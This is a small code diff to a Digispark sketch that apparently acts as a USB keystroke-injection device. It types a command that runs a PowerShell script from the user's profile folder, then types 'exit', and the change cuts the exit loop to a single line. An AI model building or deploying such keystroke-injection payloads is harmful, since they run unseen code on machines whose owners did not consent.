@@ -34,12 +34,7 @@ void loop() {
 
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
   DigiKeyboard.delay(4000);
-  for (int i = 0; i < 2; i++)
-  {
-    DigiKeyboard.delay(300);
-    DigiKeyboard.println("exit");
-  }
-
+  DigiKeyboard.println("exit");
   digitalWrite(1, LOW);
   for(;;){}
 }
